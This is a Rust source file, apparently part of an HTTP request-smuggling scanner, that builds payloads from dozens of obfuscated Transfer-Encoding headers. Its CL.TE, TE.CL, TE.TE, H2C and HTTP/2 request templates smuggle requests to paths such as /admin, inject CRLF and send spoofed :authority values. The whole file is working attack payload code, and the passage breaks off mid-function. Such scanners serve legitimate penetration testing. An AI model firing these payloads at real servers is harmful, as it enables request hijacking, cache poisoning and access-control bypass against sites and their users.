/// Helper function to format custom headers into a string
pub fn format_custom_headers(custom_headers: &[String]) -> String {
    if custom_headers.is_empty() {
        String::new()
    } else {
        format!("{}\r\n", custom_headers.join("\r\n"))
    }
}

/// Helper function to format cookies into a Cookie header
pub fn format_cookies(cookies: &[String]) -> String {
    if cookies.is_empty() {
        String::new()
    } else {
        format!("Cookie: {}\r\n", cookies.join("; "))
    }
}

/// Generate Transfer-Encoding header variations for CL.TE and TE.CL attacks
/// Based on PortSwigger's http-request-smuggler patterns
pub fn get_te_header_variations() -> Vec<String> {
    let mut te_headers = vec![
        // === Basic vanilla variation ===
        "Transfer-Encoding: chunked".to_string(),
        // === Whitespace variations ===
        " Transfer-Encoding: chunked".to_string(), // Space prefix (nameprefix with space)
        "\tTransfer-Encoding: chunked".to_string(), // Tab prefix
        "Transfer-Encoding : chunked".to_string(), // Space before colon (space1)
        "Transfer-Encoding  : chunked".to_string(), // Double space before colon
        "Transfer-Encoding\t: chunked".to_string(), // Tab before colon
        "Transfer-Encoding:\tchunked".to_string(), // Tab after colon
        "Transfer-Encoding\t:\tchunked".to_string(), // Tab around colon
        "Transfer-Encoding:  chunked".to_string(), // Double space after colon
        "Transfer-Encoding:chunked".to_string(),   // No space after colon (nospace1)
        "Transfer-Encoding: chunked ".to_string(), // Trailing space
        "Transfer-Encoding: chunked\t".to_string(), // Trailing tab (tabsuffix)
        "Transfer-Encoding: chunked\r".to_string(), // CR suffix (0dsuffix)
        // === Line wrapping/folding variations (HTTP/1.1 obs-fold) ===
        "Transfer-Encoding:\n chunked".to_string(), // Newline + space (linewrapped1)
        "Transfer-Encoding:\r\n chunked".to_string(), // CRLF + space (line folding)
        "Transfer-Encoding:\r\n\tchunked".to_string(), // CRLF + tab (tabwrap)
        "Transfer-Encoding\r\n : chunked".to_string(), // CRLF before colon
        "Transfer-Encoding:\r\n \r\n chunked".to_string(), // Double wrapped (doublewrapped)
        "Foo: bar\r\n Transfer-Encoding: chunked".to_string(), // Line-folded after another header (nameprefix1)
        "Foo: bar\r\n\tTransfer-Encoding: chunked".to_string(), // Tab-prefixed after header (nameprefix2)
        // === Control character variations ===
        "Transfer-Encoding:\x0Bchunked".to_string(), // Vertical tab after colon
        "Transfer-Encoding: \x0Bchunked".to_string(), // Vertical tab in value (vertwrap)
        "Transfer-Encoding:\x0Cchunked".to_string(), // Form feed after colon
        "Transfer-Encoding: chunked\n\x0B".to_string(), // Vertical tab wrap after value
        // === Special prefix/suffix bytes ===
        "\x00Transfer-Encoding: chunked".to_string(), // Null byte prefix
        "Transfer-Encoding\x00: chunked".to_string(), // Null in header name
        "Transfer-Encoding: chunked\x00".to_string(), // Null suffix
        "\x7FTransfer-Encoding: chunked".to_string(), // DEL char prefix
        "Transfer-Encoding\x7F: chunked".to_string(), // DEL in header name
        // === Quote variations ===
        "Transfer-Encoding: \"chunked\"".to_string(), // Double quoted (quoted)
        "Transfer-Encoding: 'chunked'".to_string(),   // Single quoted (aposed)
        // === Multiple encoding values ===
        "Transfer-Encoding: chunked, identity".to_string(), // Comma-separated (commaCow)
        "Transfer-Encoding: identity, chunked".to_string(), // Reversed order (cowComma)
        "Transfer-Encoding: chunked,identity".to_string(),  // No space after comma
        "Transfer-Encoding: identity,chunked".to_string(),  // No space, reversed
        "Transfer-Encoding: chunked , identity".to_string(), // Spaces around comma
        "Transfer-Encoding: identity, chunked, identity".to_string(), // Nested encoding
        // === Header name variations ===
        "Transfer_Encoding: chunked".to_string(), // Underscore instead of hyphen (underjoin1)
        "Transfer Encoding: chunked".to_string(), // Space instead of hyphen (spacejoin1)
        "Transfer\\Encoding: chunked".to_string(), // Backslash instead of hyphen
        "Transfer\x00Encoding: chunked".to_string(), // Null in hyphen position
        // === Case variations ===
        "transfer-encoding: chunked".to_string(), // Lowercase
        "TRANSFER-ENCODING: chunked".to_string(), // Uppercase
        "TRANSFER-ENCODING: CHUNKED".to_string(), // All uppercase
        "tRaNsFeR-eNcOdInG: cHuNkEd".to_string(), // Mixed case (multiCase)
        "Transfer-encoding: chunked".to_string(), // First letter caps only
        // === Value variations ===
        "Transfer-Encoding: chunk".to_string(), // Truncated value (lazygrep)
        "Transfer-Encoding: CHUNKED".to_string(), // Uppercase value
        "Transfer-Encoding:  Chunked".to_string(), // Mixed case with extra space
        // === Bad line ending variations ===
        "Foo: bar\rTransfer-Encoding: chunked".to_string(), // CR only before TE (badsetupCR)
        "Foo: bar\nTransfer-Encoding: chunked".to_string(), // LF only before TE (badsetupLF)
        "Foo: bar\r\n\rTransfer-Encoding: chunked".to_string(), // Extra CR (0dwrap)
        // === CR injection variations ===
        "Tra\rnsfer-Encoding: chunked".to_string(), // CR in header name (0dspam)
        "Transfer-\rEncoding: chunked".to_string(), // CR after hyphen
        "Transfer-Encoding:\r chunked".to_string(), // CR + space after colon
        // === Junk/garbage variations ===
        "Transfer-Encoding x: chunked".to_string(), // Junk before colon (spjunk)
        "Transfer-Encoding: x chunked".to_string(), // Junk in value
        "X: y\r\nTransfer-Encoding: chunked".to_string(), // Preceded by junk header
        // === URL-encoded variations ===
        "Transfer-%45ncoding: chunked".to_string(), // URL-encoded E (encode)
        "Transfer-Encoding: %63hunked".to_string(), // URL-encoded c in value
        // === MIME encoding variations ===
        "Transfer-Encoding: =?iso-8859-1?B?Y2h1bmtlZA==?=".to_string(), // Base64 MIME (qencode)
        "Transfer-Encoding: =?UTF-8?B?Y2h1bmtlZA==?=".to_string(), // UTF-8 Base64 MIME (qencodeutf)
        // === HTTP/1.0 style ===
        "Transfer-Encoding: chunked".to_string(), // Standard for HTTP/1.0 test
    ];

    // Add extended ASCII variations (bytes > 0x7F) using String::from_utf8_lossy
    // These patterns are inspired by PortSwigger's nel, nbsp, shy, spaceFF, accentTE, accentCH
    let extended_ascii_patterns: Vec<String> = vec![
        // NEL character (0x85) - Next Line
        format!(
            "Transfer-Encoding{}: chunked",
            String::from_utf8_lossy(&[0x85])
        ),
        // NBSP (0xA0) - Non-Breaking Space
        format!(
            "Transfer-Encoding{}: chunked",
            String::from_utf8_lossy(&[0xA0])
        ),
        // Soft hyphen (0xAD) replacing hyphen
        format!(
            "Transfer{}Encoding: chunked",
            String::from_utf8_lossy(&[0xAD])
        ),
        // NBSP after colon
        format!(
            "Transfer-Encoding:{}chunked",
            String::from_utf8_lossy(&[0xA0])
        ),
        // High byte (0xFF) in value
        format!(
            "Transfer-Encoding: {}chunked",
            String::from_utf8_lossy(&[0xFF])
        ),
        // Accented character in name (0x82 - Latin Small Letter E with Acute in some encodings)
        format!(
            "Transf{}r-Encoding: chunked",
            String::from_utf8_lossy(&[0x82])
        ),
        // Accented character in value (0x96 - En Dash in some encodings)
        format!(
            "Transfer-Encoding: ch{}nked",
            String::from_utf8_lossy(&[0x96])
        ),
    ];
    te_headers.extend(extended_ascii_patterns);

    // Control character constants for header manipulation patterns
    // These are common control characters used in HTTP request smuggling attacks
    const NUL: u8 = 0x00; // Null byte - can cause early string termination in some parsers
    const TAB: u8 = 0x09; // Horizontal tab - valid HTTP whitespace
    const LF: u8 = 0x0A; // Line feed - HTTP line separator
    const VT: u8 = 0x0B; // Vertical tab - not valid HTTP whitespace, but sometimes accepted
    const FF: u8 = 0x0C; // Form feed - not valid HTTP whitespace, but sometimes accepted
    const CR: u8 = 0x0D; // Carriage return - HTTP line separator
    const SP: u8 = 0x20; // Space - valid HTTP whitespace
    const DEL: u8 = 0x7F; // Delete character - can cause parsing issues

    // Add whitespace prefix variations with common control characters
    // These test how parsers handle control characters before header names
    for ch in [NUL, TAB, LF, VT, FF, CR, SP, DEL].iter() {
        if *ch != TAB && *ch != SP {
            // Skip tab and space as they're already covered in basic variations
            te_headers.push(format!(
                "{}Transfer-Encoding: chunked",
                String::from_utf8_lossy(&[*ch])
            ));
        }
    }

    // Add suffix variations with control characters after the value
    // These test how parsers handle trailing control characters
    for ch in [NUL, TAB, VT, FF, DEL].iter() {
        te_headers.push(format!(
            "Transfer-Encoding: chunked{}",
            String::from_utf8_lossy(&[*ch])
        ));
    }

    // Add header name suffix variations (control character before colon)
    // These test how parsers handle control characters in header names
    for ch in [NUL, TAB, VT, FF, DEL].iter() {
        te_headers.push(format!(
            "Transfer-Encoding{}: chunked",
            String::from_utf8_lossy(&[*ch])
        ));
    }

    te_headers
}

/// Generate CL.TE (Content-Length vs Transfer-Encoding) attack payloads
pub fn get_cl_te_payloads(
    path: &str,
    host: &str,
    method: &str,
    custom_headers: &[String],
    cookies: &[String],
) -> Vec<String> {
    let te_headers = get_te_header_variations();

    let mut payloads = Vec::new();
    let custom_header_str = format_custom_headers(custom_headers);
    let cookie_str = format_cookies(cookies);

    for te_header in &te_headers {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
             Host: {}\r\n\
             Connection: keep-alive\r\n\
             {}\
             {}\
             Content-Length: 6\r\n\
             {}\r\n\
             \r\n\
             0\r\n\
             \r\n\
             G",
            method, path, host, custom_header_str, cookie_str, te_header
        ));
    }
    payloads
}

/// Generate TE.CL (Transfer-Encoding vs Content-Length) attack payloads
pub fn get_te_cl_payloads(
    path: &str,
    host: &str,
    method: &str,
    custom_headers: &[String],
    cookies: &[String],
) -> Vec<String> {
    let te_headers = get_te_header_variations();

    let mut payloads = Vec::new();
    let custom_header_str = format_custom_headers(custom_headers);
    let cookie_str = format_cookies(cookies);

    for te_header in &te_headers {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
             Host: {}\r\n\
             Connection: keep-alive\r\n\
             {}\
             {}\
             Content-Length: 4\r\n\
             {}\r\n\
             \r\n\
             1\r\n\
             A\r\n\
             0\r\n\
             \r\n",
            method, path, host, custom_header_str, cookie_str, te_header
        ));
    }
    payloads
}

/// Generate TE.TE (Transfer-Encoding obfuscation) attack payloads
/// These payloads use two Transfer-Encoding headers to test for parser discrepancies
pub fn get_te_te_payloads(
    path: &str,
    host: &str,
    method: &str,
    custom_headers: &[String],
    cookies: &[String],
) -> Vec<String> {
    let custom_header_str = format_custom_headers(custom_headers);
    let cookie_str = format_cookies(cookies);

    let te_variations = vec![
        // === Basic dual header variations ===
        ("Transfer-Encoding: chunked", "Transfer-Encoding: identity"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: x-custom"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: cow"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: compress"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: deflate"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: gzip"),
        // === Reversed dual chunk (revdualchunk) ===
        ("Transfer-Encoding: identity", "Transfer-Encoding: chunked"),
        // === Combined encodings ===
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: gzip, chunked",
        ),
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: chunked, identity",
        ),
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: identity, chunked",
        ),
        // === Nested encodings (nested) ===
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: identity, chunked, identity",
        ),
        // === Whitespace variations for second header ===
        ("Transfer-Encoding: chunked", " Transfer-Encoding: chunked"),
        ("Transfer-Encoding: chunked", "\tTransfer-Encoding: chunked"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding : chunked"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding:\tchunked"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding:  chunked"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding:chunked"),
        // === Quote variations ===
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: \"chunked\"",
        ),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: 'chunked'"),
        // === Case variations ===
        ("Transfer-Encoding: chunked", "transfer-encoding: chunked"),
        ("Transfer-Encoding: chunked", "TRANSFER-ENCODING: CHUNKED"),
        ("Transfer-Encoding: chunked", "TRANSFER-ENCODING: chunked"),
        ("Transfer-Encoding: chunked", "TrAnSfEr-EnCoDiNg: ChUnKeD"),
        ("Transfer-Encoding: chunked", "Transfer-encoding: chunked"),
        // === Header name variations ===
        ("Transfer-Encoding: chunked", "Transfer_Encoding: chunked"),
        ("Transfer-Encoding: chunked", "Transfer Encoding: chunked"),
        ("Transfer-Encoding: chunked", "Transfer\\Encoding: chunked"),
        // === Line folding variations ===
        ("Transfer-Encoding: chunked", "Transfer-Encoding:\n chunked"),
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding:\r\n chunked",
        ),
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding:\r\n\tchunked",
        ),
        // === Control character variations ===
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding:\x0Bchunked",
        ),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: chunked\r"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: chunked\t"),
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: chunked\x00",
        ),
        // === Truncated/lazygrep variation ===
        ("Transfer-Encoding: chunked", "Transfer-Encoding: chunk"),
        // === Bad setup line endings ===
        (
            "Transfer-Encoding: chunked",
            "Foo: bar\rTransfer-Encoding: chunked",
        ),
        (
            "Transfer-Encoding: chunked",
            "Foo: bar\nTransfer-Encoding: chunked",
        ),
        // === Content-Encoding confusion (contentEnc) ===
        ("Transfer-Encoding: chunked", "Content-Encoding: chunked"),
        // === URL-encoded variations ===
        ("Transfer-Encoding: chunked", "Transfer-%45ncoding: chunked"),
        // === Connection header combination ===
        (
            "Transfer-Encoding: chunked",
            "Connection: Transfer-Encoding\r\nTransfer-Encoding: chunked",
        ),
    ];

    // Add extended ASCII variations for TE.TE (bytes > 0x7F)
    let extended_te_te_variations: Vec<(String, String)> = vec![
        // NEL character (0x85)
        (
            "Transfer-Encoding: chunked".to_string(),
            format!(
                "Transfer-Encoding{}: chunked",
                String::from_utf8_lossy(&[0x85])
            ),
        ),
        // NBSP (0xA0)
        (
            "Transfer-Encoding: chunked".to_string(),
            format!(
                "Transfer-Encoding{}: chunked",
                String::from_utf8_lossy(&[0xA0])
            ),
        ),
    ];

    let mut payloads = Vec::new();
    for (te1, te2) in te_variations {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
            Host: {}\r\n\
            {}\
            {}\
            Content-Length: 4\r\n\
            {}\r\n\
            {}\r\n\
            \r\n\
            1\r\n\
            A\r\n\
            0\r\n\
            \r\n",
            method, path, host, custom_header_str, cookie_str, te1, te2
        ));
    }

    // Add extended ASCII variations
    for (te1, te2) in extended_te_te_variations {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
            Host: {}\r\n\
            {}\
            {}\
            Content-Length: 4\r\n\
            {}\r\n\
            {}\r\n\
            \r\n\
            1\r\n\
            A\r\n\
            0\r\n\
            \r\n",
            method, path, host, custom_header_str, cookie_str, te1, te2
        ));
    }

    payloads
}

/// Generate H2C (HTTP/2 Cleartext) smuggling attack payloads
/// H2C smuggling exploits discrepancies in how proxies handle HTTP/1.1 to HTTP/2 upgrade requests
/// Reference: https://bishopfox.com/blog/h2c-smuggling-request
pub fn get_h2c_payloads(
    path: &str,
    host: &str,
    method: &str,
    custom_headers: &[String],
    cookies: &[String],
) -> Vec<String> {
    let custom_header_str = format_custom_headers(custom_headers);
    let cookie_str = format_cookies(cookies);

    let mut payloads = Vec::new();

    // Basic H2C upgrade request
    // The front-end may not process the upgrade, but the back-end might
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Connection: Upgrade, HTTP2-Settings\r\n\
         Upgrade: h2c\r\n\
         HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // H2C upgrade with smuggled request (using Content-Length discrepancy)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Connection: Upgrade, HTTP2-Settings\r\n\
         Upgrade: h2c\r\n\
         HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
         Content-Length: 30\r\n\
         \r\n\
         GET /smuggled HTTP/1.1\r\n\
         Foo: x",
        method, path, host, custom_header_str, cookie_str
    ));

    // H2C upgrade with different Connection header variations
    let connection_variations = vec![
        "Connection: Upgrade, HTTP2-Settings, close",
        "Connection: Upgrade,HTTP2-Settings",
        "Connection: Upgrade, HTTP2-Settings, keep-alive",
        "Connection: HTTP2-Settings, Upgrade",
        "Connection: upgrade, http2-settings", // lowercase
        "Connection: UPGRADE, HTTP2-SETTINGS", // uppercase
    ];

    for conn_header in &connection_variations {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
             Host: {}\r\n\
             {}\
             {}\
             {}\r\n\
             Upgrade: h2c\r\n\
             HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
             Content-Length: 0\r\n\
             \r\n",
            method, path, host, custom_header_str, cookie_str, conn_header
        ));
    }

    // Upgrade header variations
    let upgrade_variations = vec![
        "Upgrade: h2c",
        "Upgrade: H2C",           // uppercase
        "Upgrade: h2c, http/1.1", // multiple protocols
        "Upgrade: http/1.1, h2c", // reversed order
        " Upgrade: h2c",          // space prefix
        "Upgrade : h2c",          // space before colon
        "Upgrade:\th2c",          // tab after colon
    ];

    for upgrade_header in &upgrade_variations {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
             Host: {}\r\n\
             {}\
             {}\
             Connection: Upgrade, HTTP2-Settings\r\n\
             {}\r\n\
             HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
             Content-Length: 0\r\n\
             \r\n",
            method, path, host, custom_header_str, cookie_str, upgrade_header
        ));
    }

    // HTTP2-Settings header variations (different base64 encoded SETTINGS frames)
    let http2_settings_variations = vec![
        "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA",  // default
        "HTTP2-Settings: AAQAAP__",                  // minimal settings
        "HTTP2-Settings: AAMAAABkAAQAAP__AAIAAAAA",  // alternate settings
        "http2-settings: AAMAAABkAARAAAAAAAIAAAAA",  // lowercase
        "HTTP2-SETTINGS: AAMAAABkAARAAAAAAAIAAAAA",  // uppercase
        "HTTP2-Settings:AAMAAABkAARAAAAAAAIAAAAA",   // no space
        " HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA", // space prefix
    ];

    for settings_header in &http2_settings_variations {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
             Host: {}\r\n\
             {}\
             {}\
             Connection: Upgrade, HTTP2-Settings\r\n\
             Upgrade: h2c\r\n\
             {}\r\n\
             Content-Length: 0\r\n\
             \r\n",
            method, path, host, custom_header_str, cookie_str, settings_header
        ));
    }

    // H2C with Transfer-Encoding (combining H2C with CL.TE techniques)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Connection: Upgrade, HTTP2-Settings\r\n\
         Upgrade: h2c\r\n\
         HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
         Content-Length: 6\r\n\
         Transfer-Encoding: chunked\r\n\
         \r\n\
         0\r\n\
         \r\n\
         G",
        method, path, host, custom_header_str, cookie_str
    ));

    // H2C with chunked encoding (combining H2C with TE.CL techniques)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Connection: Upgrade, HTTP2-Settings\r\n\
         Upgrade: h2c\r\n\
         HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
         Transfer-Encoding: chunked\r\n\
         Content-Length: 4\r\n\
         \r\n\
         1\r\n\
         A\r\n\
         0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // Double upgrade headers (upgrade obfuscation similar to TE.TE)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Connection: Upgrade, HTTP2-Settings\r\n\
         Upgrade: h2c\r\n\
         Upgrade: http/1.1\r\n\
         HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // H2C with different HTTP2-Settings positions (HTTP2-Settings before Host)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Connection: Upgrade, HTTP2-Settings\r\n\
         Upgrade: h2c\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    payloads
}

/// Generate H2 (HTTP/2 Protocol) smuggling attack payloads
/// HTTP/2 desync attacks exploit discrepancies in how front-end and back-end servers handle HTTP/2 features
/// Reference: https://portswigger.net/research/http2
pub fn get_h2_payloads(
    path: &str,
    host: &str,
    method: &str,
    custom_headers: &[String],
    cookies: &[String],
) -> Vec<String> {
    let custom_header_str = format_custom_headers(custom_headers);
    let cookie_str = format_cookies(cookies);

    let mut payloads = Vec::new();

    // === HTTP/2 Pseudo-Header Injection Attacks ===
    // These attacks exploit how servers handle duplicate or malformed pseudo-headers

    // Duplicate :method pseudo-header
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         :method: GET\r\n\
         :method: POST\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // Duplicate :path pseudo-header
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         :path: {}\r\n\
         :path: /admin\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str, path
    ));

    // Duplicate :authority pseudo-header (similar to Host header in HTTP/2)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         :authority: {}\r\n\
         :authority: malicious.com\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str, host
    ));

    // Duplicate :scheme pseudo-header
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         :scheme: https\r\n\
         :scheme: http\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // === Header Name with Colon Attacks ===
    // HTTP/2 allows colons in header names (as pseudo-headers), but HTTP/1.1 doesn't

    // Header name starting with colon (non-pseudo-header)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         :custom-header: value\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // Header name with colon in the middle
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         x-custom:header: value\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // === HTTP/2 Content-Length Conflicts ===
    // HTTP/2 uses frame length, but some proxies still process Content-Length

    // Content-Length mismatch with smuggled request
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Content-Length: 0\r\n\
         \r\n\
         GET /smuggled HTTP/1.1\r\n\
         Host: {}\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str, host
    ));

    // Multiple Content-Length headers (forbidden in HTTP/2 but might be forwarded)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Content-Length: 0\r\n\
         Content-Length: 44\r\n\
         \r\n\
         GET /smuggled HTTP/1.1\r\n\
         Host: {}\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str, host
    ));

    // === Header Value with Newline Attacks ===
    // HTTP/2 doesn't allow newlines in header values, but HTTP/1.1 might accept them

    // Header value with embedded newline
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         X-Custom: value1\nX-Injected: injected\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // Header value with CRLF injection
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         X-Custom: value1\r\nX-Injected: injected\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // === HTTP/2 Transfer-Encoding (forbidden in HTTP/2) ===
    // HTTP/2 forbids Transfer-Encoding, but proxies might forward it to HTTP/1.1 backends

    // Transfer-Encoding in HTTP/2 context (should be rejected but might be smuggled)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Transfer-Encoding: chunked\r\n\
         Content-Length: 6\r\n\
         \r\n\
         0\r\n\
         \r\n\
         G",
        method, path, host, custom_header_str, cookie_str
    ));

    // === Connection-Specific Headers (forbidden in HTTP/2) ===
    // HTTP/2 forbids connection-specific headers like Connection, Keep-Alive, etc.

    // Connection header (forbidden in HTTP/2)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Connection: close\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // Keep-Alive header (forbidden in HTTP/2)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Keep-Alive: timeout=5\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // Proxy-Connection header (forbidden in HTTP/2)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Proxy-Connection: keep-alive\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // === Case Sensitivity Attacks ===
    // HTTP/2 requires lowercase header names, HTTP/1.1 is case-insensitive

    // Mixed-case pseudo-header (invalid in HTTP/2)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         :Method: POST\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // Uppercase pseudo-header (invalid in HTTP/2)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         :PATH: /admin\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // === Header Field Ordering Attacks ===
    // HTTP/2 requires pseudo-headers before regular headers

    // Regular header before pseudo-header (violates HTTP/2 spec)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         X-Custom: value\r\n\
         :method: POST\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // === HTTP/2 Header Name Validation Bypass ===
    // Test characters that are valid in HTTP/2 but not in HTTP/1.1

    // Header name with underscore (more permissive in HTTP/2)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         x_custom_header: value\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // === Content-Length: 0 with Body ===
    // HTTP/2 uses frame length, so Content-Length: 0 with body might be processed differently

    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Content-Length: 0\r\n\
         \r\n\
         unexpected body content",
        method, path, host, custom_header_str, cookie_str
    ));

    // === HTTP/2 Downgrade with Smuggled Request ===
    // Attack that exploits HTTP/2 to HTTP/1.1 downgrade

    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
         Content-Length: 0\r\n\
         Transfer-Encoding: chunked\r\n\
         \r\n\
         0\r\n\
         \r\n\
         GET /smuggled HTTP/1.1\r\n\
         Host: {}\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str, host
    ));

    // === Request Splitting via Header Injection ===
    // Inject full request in header value

    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         X-Custom: value\r\n\
         \r\n\
         GET /smuggled HTTP/1.1\r\n\
         Host: {}\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str, host
    ));

    // === Additional HTTP/2 Specific Attacks ===

    // HTTP/2 with multiple pseudo-headers of different types
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         :method: GET\r\n\
         :path: /admin\r\n\
         :authority: malicious.com\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // Transfer-Encoding with pseudo-header (combining forbidden elements)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         :method: POST\r\n\
         Transfer-Encoding: chunked\r\n\
         Content-Length: 6\r\n\
         \r\n\
         0\r\n\
         \r\n\
         G",
        method, path, host, custom_header_str, cookie_str
    ));

    // Pseudo-header after body (severe HTTP/2 violation)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Content-Length: 0\r\n\
         \r\n\
         :path: /injected",
        method, path, host, custom_header_str, cookie_str
    ));

    // Multiple Content-Length with pseudo-header
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         :authority: {}\r\n\
         Content-Length: 10\r\n\
         Content-Length: 0\r\n\
         \r\n\
         smuggled",
